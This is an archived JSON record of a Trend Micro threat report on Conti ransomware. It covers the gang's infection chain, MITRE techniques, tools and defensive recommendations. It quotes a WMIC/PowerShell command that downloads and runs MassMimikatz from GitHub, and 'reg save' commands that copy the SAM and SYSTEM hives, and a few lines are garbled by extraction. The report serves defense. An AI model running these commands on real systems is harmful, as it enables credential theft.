{
    "id": "bca0adda-5782-4028-9efc-8cffb4b2237c",
    "created_at": "2023-01-12T15:01:02.18556Z",
    "updated_at": "2025-03-27T02:09:17.797461Z",
    "deleted_at": null,
    "sha1_hash": "59782360ead9becee5ef490d7eab94983c115226",
    "title": "2021-12-01 - Ransomware Spotlight- Conti",
    "authors": "",
    "file_creation_date": "2022-05-28T16:01:46Z",
    "file_modification_date": "2022-05-28T16:01:46Z",
    "file_size": 711838,
    "plain_text": "# Ransomware Spotlight: Conti\n\n**trendmicro.com/vinfo/us/security/news/ransomware-spotlight/ransomware-spotlight-conti**\n\nX\n\nConti\n\nBy Trend Micro Research\n\nAssumed to be the successor of the Ryuk ransomware, Conti is currently one of the most notorious active ransomware families used in highprofile attacks. Know all about this ransomware family and protect your company against this threat.\n\n\n-----\n\nView infographic of \"Ransomware Spotlight: Conti\"\n\n[What do you need to know about Conti ransomware to help secure your organization?](https://www.trendmicro.com/vinfo/us/security/definition/ransomware)\n\nAssumed to be the successor of the [Ryuk ransomware,](https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/addressing-threats-like-ryuk-via-trend-micro-xdr) [Conti is currently one of the most notorious active ransomware families, and is used as](https://www.trendmicro.com/en_us/research/21/c/vision-one-tracking-conti-ransomware.html)\na [ransomware-as-a-service (RaaS) in high-profile attacks such as those launched against healthcare institutions in Ireland and](https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/ransomware-as-a-service-enabler-of-widespread-attacks) [New Zealand.](https://www.rnz.co.nz/news/national/442795/waikato-hospitals-hit-by-cyber-security-incident)\n\n[Conti operators also leverage double extortion techniques, and have resorted to not just publishing stolen data, but also selling access to](https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/ransomware-double-extortion-and-beyond-revil-clop-and-conti)\nvictim organizations that refused to pay the ransom.\n\nArmed with other stealthy techniques such as BazarLoader and other tricks up its sleeves, the Conti ransomware family has the tenth-most\n[attack attempts detected in the first half of the year, as reported in the Trend Micro 2021 Midyear Cybersecurity Report.](https://www.trendmicro.com/vinfo/us/security/research-and-analysis/threat-reports/roundup/attacks-from-all-angles-2021-midyear-security-roundup)\n\nOn March 2, 2022, a Ukrainian researcher reportedly leaked some of the ransomware group’s files. Although the Conti group mostly uses\nopen-source tools, this leak included important components, such as the code for the administrator panel, Conti Locker v2, and a decryptor.\n\nThis code dump could potentially have a significant impact on the RaaS landscape. While on the cybersecurity side, researchers will be able to\nuse this to gain further insight into Conti’s operations, the leak could also serve as a start-up kit for groups who may not have otherwise had\nthe means to create their own RaaS operation. This development might end up being similar to the change seen in the internet-of-things (IoT)\nand Linux malware space when Mirai source code was leaked, where its code immediately become the new baseline for malicious actors,\neffectively raising the overall base sophistication of the IoT cybercrime landscape.\n\nAs one of the most prolific and capable groups operating today, we would like to emphasize that the leak does not signal that Conti is in any\nway under pressure and at risk of shutting down — rather, we believe that it will force the ransomware gang to improve their capabilities and\nsecurity to stay ahead of competitor groups who can use their leaked code to catch up. In addition, while the gang continues to operate as\nnormal, we would expect new groups to emerge using the same tools, tactics, and procedures.\n\nThis article details the Conti ransomware to help incident responders and security teams spot attacks easier.\n\n## Top affected industries and counties\n\nConti attacks have been detected all over the globe, with the US amassing over a million attack attempts from January 1 to November 12,\n2021. The Netherlands and Taiwan ranked second and third respectively.\n\nFigure 1. Countries with the highest number of attack attempts for Conti ransomware (January 1 to November 12, 2021)\n\n_Source: Trend Micro™ Smart Protection Network™ infrastructure_\n\nThe retail industry saw the most Conti attack attempts, followed by insurance, manufacturing, and telecommunications. Healthcare, which\n[Conti operators targeted in high-profile attacks this year, is sixth on the list.](https://www.theregister.com/2021/05/14/ireland_hse_ransomware_hospital_conti_wizardspider/)\n\n\n-----\n\nFigure 2. Industries with the highest number of attack attempts for Conti ransomware (January 1 to November 12, 2021)\n\n_Source: Trend Micro™ Smart Protection Network™ infrastructure_\n\n## Infection chain and techniques\n\nFigure 3. Conti infection chain\n\n**Initial Access**\n\nConti can arrive in the system through BazarLoader, which is delivered via phishing emails containing a Google Drive link that downloads\nthe malware.\n[Alternatively, the ransomware can arrive via exploiting the the FortiGate firewall vulnerabilities CVE-2018-13379 and](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-13379) [CVE-2018-13374.](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-13374)\nAfter successfully exploiting the application, the ransomware deploys Cobalt Strike to gain a foothold on the system.\nConti can also arrive as a result of the exploitation of the ProxyShell Microsoft Exchange vulnerabilities.\n\n**Discovery**\n\nFor initial reconnaissance, the Conti group uses tools such as Whoami, Nltest, and Net. These tools give the operators information about\nwhere they are in the system, and what rights and permissions they have.\n[Since the operators employ double extortion tactics, they actively look for files to exfiltrate in the discovery stage. The threat actors use](https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/ransomware-double-extortion-and-beyond-revil-clop-and-conti)\ntools such as ShareFinder to identify the shares needed for exfiltration and ransomware deployment.\n\n**Privilege Escalation**\n\n\n-----\n\nt oug t e g oup ost y e es o d g t e do a ad c ede t a s to ga u access to t e do a, t ey ay a so use a coup e o\n[exploits like Zerologon (CVE-2020-1472) and PrintNightmare (CVE-2021-1675), to elevate their privilege and further strengthen their](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-1472)\nfoothold in the network.\n\n**Credential Access**\n\nThe attackers dump cached credentials on systems to allow them to move laterally or elevate their privilege. They use tools such as\nProcDump to dump system process/es (usually lssas.exe) and use it in combination with Mimikatz to dump credentials.\nIn other cases, they may use mass-mimikatz, a module from Empire, to dump the credentials on multiple systems.\n\nMimikatz (mass-mimikatz, from Empire)\n\nC:\\WINDOWS\\SYSTEM32\\WBEM\\WMIC.exe /node:localhost process call create powershell /c IEX\n(NewObjectNet.WebClient).DownloadString('https://raw.githubusercontent[.]com/PowerShellEmpire/PowerTools/master/PewPewPew/In\nMassMimikatz.ps1');'24346D,COMPUTERNAME2'|Invoke-MassMimikatz -Verbose > c:/programdata/2.txt\nAlternatively, they may also use the kerberoasting module of the PowerShell empire or use tools like Rubeus.\nThe attackers may also use native Windows tools, such as Task Manager, to dump the memory of lsass or use the comsvcs DLL file’s\nMiniDump function.\n\nThey also gain access to the credentials by taking them out of password stores.\n\nOne of the ways to do this is through “reg save” commands.\n\n     - reg save HKLM\\SAM C:\\programdata\\SamBkup.hiv\n\n     - reg save HKLM\\SYSTEM C:\\programdata\\FileName.hiv\nThey can also use tools such as Get-GPPPassword to get plain text passwords stored in the group policy preference\nThey can also gain credentials from browsers and cloud applications using tools such as SharpChrome and SeatBelt.\nAfter gaining enough credentials, they use SMBAutoBrute to automate the task of bruteforcing the passwords and see what password\nworks.\nAfter gaining information on the domain accounts, the attackers then dump the domain controller credentials using Ntdsutil.\nAlternatively, they can also use Vssadmin to create a snapshot of the system and download Ntds.dit to accomplish this.\n\n**Lateral Movement**\n\nThe attackers can also use batch files to disable security tools. These files are executed through scheduled tasks.\nThe groups are also known to use third-party tools such as Atera and AnyDesk to control remote systems.\nThe operators are also known to use EternalBlue to move laterally in the network of systems that are vulnerable to this exploit.\nThey also use PSExec to remotely execute scripts and the ransomware itself.\n\n**Defense Evasion**\n\nJust before the execution of the ransomware, threat actors create a series of batch files to automate the distribution of its tools in the\ndomain. These tools include scripts to terminate existing security software.\nThe operators can also use other tools, like GMER, PC Hunter, and PowerShell, to accomplish this.\n\n**Execution**\n\nTies to the Trickbot gang gave Conti operators the ability to execute the ransomware via BazarLoader, which leads to Cobalt Strike,\nwhich eventually leads to the ransomware itself.\nOnce the actors are inside the network, they tend to use scheduled tasks and batch files as a means of execution on remote systems.\nAlternatively, to execute the ransomware the operators can use files such as the DontSleep.exe process, which calls the task manager\nwhere the file can be executed.\n\n**Exfiltration**\n\nThe attackers perform data exfiltration on the system with the use of the Rclone tool, which is an open-source tool used for syncing files\nto a specified cloud storage, such as Mega cloud storage.\nThe group can also use WinSCP to exfiltrate data.\n\n**Impact**\n\n\n-----\n\nte e t at o a d d st but o o t e a so a e to t e ta geted e dpo ts, t e es a e o e c ypted us g C aC a 0 t\nRSA4096 to protect the ChaCha key and nonce.\nThe ransomware also inhibits system recovery by deleting shadow copies using WMI.\n\n## MITRE tactics and techniques\n\n\n**Initial**\n**Access** **Execution** **Persistence**\n\n\n**Credential**\n**Access**\n\n**T1003 - OS**\ncredential\ndumping\n\n_Dumps_\n_LSASS_\n_memory to be_\n_used for_\n_retrieving_\n_password_\n_hashes_\n\n**T1555 -**\nCredentials\nfrom password\nstores\n\n_Extracts_\n_passwords_\n_from_\n_credential_\n_stores using_\n_tools such as_\n_SharpChrome,_\n_Seatbelt, and_\n_net-_\n_GPPPassword_\n\n**T1552 -**\nUnsecured\ncredentials\n\n_Retrieves_\n_credentials_\n_using_\n_Mimikatz_\n\n\n**Lateral**\n**Movement** **Defense Evasion**\n\n\n**Command**\n**and Control** **Exfilt**\n\n\n**T1566 -**\nPhishing\n\n_Arrives via_\n_phishing_\n_emails with_\n_BazarLoader_\n\n**T1190 -**\nExploit\npublic-facing\napplication\n\n_Arrives via_\n_firewall_\n_exploits_\n_(CVE-2018-_\n_13379 and_\n_CVE-2018-_\n_13374)_\n\n\n**T1106 -**\nExecution\nthrough API\n\n_Uses native_\n_API to execute_\n_commands_\n_such as_\n_deleting_\n_shadow copies_\n\n**T1059.003 -**\nCommand and\nscripting\ninterpreter:\nWindows\ncommand shell\n\n_Uses batch_\n_files to_\n_distribute and_\n_execute_\n_ransomware_\n\n**T1047 -**\nWindows\nManagement\nInstrumentation\n\n_Uses WMI to_\n_execute batch_\n_files and delete_\n_shadow copies_\n\n**T1204 - User**\nexecution\n\n_User execution_\n_is needed to_\n_carry out the_\n_payload from_\n_the spear_\n_phishing link_\n\n**T1053.005 -**\nScheduled\ntask/job:\nscheduled task\n\n_Uses_\n_scheduled_\n_tasks as a_\n_means of_\n_execution for_\n_the_\n_ransomware_\n\n\n**T1053.005 -**\nScheduled\ntask/job:\nScheduled\ntask\n_Uses_\n_scheduled_\n_tasks as a_\n_means of_\n_execution_\n_for the_\n_ransomware_\n\n\n**Privilege**\n**Escalation**\n\n**T1078.002 -**\nValid accounts:\ndomain\naccounts\n\n_Uses domain_\n_administrator_\n_accounts to_\n_escalate_\n_privilege in the_\n_system_\n\n**T1083 - File**\nand directory\ndiscovery\n\n_Searches for_\n_specific files_\n_and directory_\n_related to its_\n_encryption_\n\n**T1018**\n\n- Remote\nsystem\ndiscovery\n\n_Enumerates_\n_ARP entries to_\n_enable_\n_distribution to_\n_remote systems_\n\n**T1057 -**\nProcess\ndiscovery\n\n_Discovers_\n_certain_\n_processes for_\n_process_\n_termination_\n\n**T1016 - System**\nnetwork\nconfiguration\ndiscovery\n\n_Enumerates_\n_ARP entries to_\n_enable_\n_distribution to_\n_remote systems_\n\n**T1069.002**\n\n- Permission\ngroups\ndiscovery:\ndomain groups\n\n_Searches for_\n_group_\n_information for_\n_privilege_\n_escalation_\n\n**T1082 - System**\ninformation\ndiscovery\n\n_Logs system_\n_information for_\n_information on_\n_the system_\n\n\n**T1570 -**\nLateral tool\ntransfer\n\n_Uses_\n_BITSAdmin to_\n_transfer tools_\n_across the_\n_network_\n\n**T1021.002 -**\nRemote\nservices:\nSMB/Windows\nadmin shares\n\n_Cobalt Strike_\n_uses admin_\n_shares to_\n_distribute itself_\n_to remote_\n_systems_\n\n\n**T1562.001 - Impair**\ndefenses: disable or\nmodify tools\n\n_Terminates certain_\n_security related_\n_software_\n\n**T1140 -**\nDeobfuscate/Decode\nfiles or information\n\n_Ransomware is_\n_obfuscated to make_\n_detection more_\n_difficult_\n\n**T1055 - Process**\ninjection\n\n_Uses process_\n_injection to make_\n_detection more_\n_difficult_\n\n\n**T1071 -**\nApplication\nLayer\nProtocol\n\n_Uses http to_\n_communicate_\n_to its C&C_\n_server_\n\n**T1219 -**\nRemote\naccess\nsoftware\n\n_Uses RMM_\n_software_\n_such as_\n_AnyDesk and_\n_Atera_\n\n\n**T156**\nExfilt\nover\nservic\nexfiltr\nto clo\nstora\n_Sync_\n_to a_\n_speci_\n_cloud_\n_stora_\n_such_\n_Mega_\n_stora_\n\n\n-----\n\n**Initial**\n**Access** **Execution** **Persistence**\n\n\n**Privilege**\n**Escalation**\n\n**T1033 - System**\nowner/user\ndiscovery\n_Performs user_\n_discovery for_\n_privilege_\n_escalation_\n\n**T1012 - Query**\nregistry\n_Queries certain_\n_registry for_\n_stored_\n_passwords_\n\n**T1063 -**\nSecurity\nsoftware\ndiscovery\nDiscovers\nsecurity\nsoftware for\nreconnaissance\nand termination\n\n\n**Credential**\n**Access**\n\n\n**Lateral**\n**Movement** **Defense Evasion**\n\n\n**Command**\n**and Control** **Exfilt**\n\n\n## Summary of malware, tools, and exploits used\n\nSecurity teams can watch out for the presence of the following malware tools, and exploits that are typically used in Conti attacks:\n\n\n**Defense**\n**Evasion**\n\nAV\nUninstall\nCobeacon\nGMER\nGpedit\nPCHunter\nPowerTool\nKillAV\n\n\n**Initial Entry** **Execution** **Discovery**\n\n\n**Privilege**\n**Escalation** **Credential Access**\n\n\nPhishing\nemails\nFirewall\nexploits\n(CVE201813379\nand\nCVE201813374)\n\n\nBazarLoader/\nBazarBackdoor\nCobalt Strike\nDontSleep\n\n\nAdfind\nNet\nNetScan\nNltest\nShareFinder\nSharpView\nPowerUpSQL\nWhoami\n\n\nEternalBlue\n(Ms17_010)\nMimikatz\nPowerUpSQL\nPrintNightmare\n(CVE-20211675)\nRouterScan\nZerologon\n(CVE-20201472)\n\n\nEComsvcs.dll\nMimikatz\nNetGPPPassword\nNtdsutil\nPowerShell\nEmpire:\nKerberoast\nProcDump\nRouterScan\nRubeus\nSharpChrome\nSMB\nAutoBrute\nTask Manager\nVssadmin\n\n\n**Lateral**\n**Movement**\n\nAnyDesk\nAtera\nBITSAdmin\nCobalt\nStrike\nEternalBlue\nMimikatz\nPsExec\n\n\n## Recommendations\n\nTo help defend systems against similar threats, organizations can establish security frameworks, which can allocate resources systematically\nfor establishing a solid defense against ransomware.\n\nHere are some best practices that can be included in these frameworks:\n\n**Audit and inventory**\n\nTake an inventory of assets and data\nIdentify authorized and unauthorized devices and software\nMake an audit of event and incident logs\n\n\n-----\n\n**Configure and monitor**\n\nManage hardware and software configurations\nGrant admin privileges and access only when necessary to an employee’s role\nMonitor network ports, protocols, and services\nActivate security configurations on network infrastructure devices such as firewalls and routers\nEstablish a software allow list that only executes legitimate applications\n\n**Patch and update**\n\nConduct regular vulnerability assessments\nPerform patching or virtual patching for operating systems and applications\nUpdate software and applications to their latest versions\n\n**Protect and recover**\n\nImplement data protection, backup, and recovery measures\nEnable multifactor authentication\n\n**Secure and defend**\n\nEmploy sandbox analysis for blocking malicious emails\nDeploy the latest versions of security solutions to all layers of the system, including email, endpoint, web, and network\n[Detect early signs of an attack such as the presence of suspicious tools in the system](https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/locked-loaded-and-in-the-wrong-hands-legitimate-tools-threat-spotlight-theme-in-2021)\nUse advanced detection technologies such as those powered by AI and machine learning\n\n**Train and test**\n\nRegularly train and assess employees on security skills\nDo red-team exercises and penetration tests\n\nA multilayered approach can help organizations guard the possible entry points into the system (endpoint, email, web, and network). Security\nsolutions can detect malicious components and suspicious behavior could help protect enterprises.\n\n[Trend Micro Vision One™ provides multilayered protection and behavior detection, which helps block questionable behavior and tools](https://www.trendmicro.com/en_us/business/products/detection-response.html)\nearly on before the ransomware can do irreversible damage to the system.\n[Trend Micro Cloud One™ Workload Security protects systems against both known and unknown threats that exploit vulnerabilities. This](https://www.trendmicro.com/en_us/business/products/hybrid-cloud/cloud-one-workload-security.html)\nprotection is made possible through techniques such as virtual patching and machine learning.\n[Trend Micro™ Deep Discovery™ Email Inspector employs custom sandboxing and advanced analysis techniques to effectively block](https://www.trendmicro.com/en_us/business/products/user-protection/sps/email-and-collaboration/email-inspector.html)\nmalicious emails, including phishing emails that can serve as entry points for ransomware.\n[Trend Micro Apex One™ offers next-level automated threat detection and response against advanced concerns such as fileless threats](https://www.trendmicro.com/en_us/business/products/user-protection/sps/endpoint.html)\nand ransomware, ensuring the protection of endpoints.\n\n## Indicators of Compromise\n\nThe IOCs for this article can be found [here. Actual indicators might vary per attack.](https://documents.trendmicro.com/images/TEx/articles/iocs_conti_spotlightG4OwzN7.txt)\n\nHIDE\n\n**Like it? Add this infographic to your site:**\n\n1. Click on the box below.  2. Press Ctrl+A to select all.  3. Press Ctrl+C to copy.  4. Paste the code into your page (Ctrl+V).\n\nImage will appear the same size as you see above.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-12-01 - Ransomware Spotlight- Conti.pdf"
    ],
    "report_names": [
        "2021-12-01 - Ransomware Spotlight- Conti.pdf"
    ],
    "threat_actors": [
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535662,
    "ts_updated_at": 1743041357,
    "ts_creation_date": 1653753706,
    "ts_modification_date": 1653753706,
    "files": {
        "pdf": "https://archive.orkl.eu/59782360ead9becee5ef490d7eab94983c115226.pdf",
        "text": "https://archive.orkl.eu/59782360ead9becee5ef490d7eab94983c115226.txt",
        "img": "https://archive.orkl.eu/59782360ead9becee5ef490d7eab94983c115226.jpg"
    }
}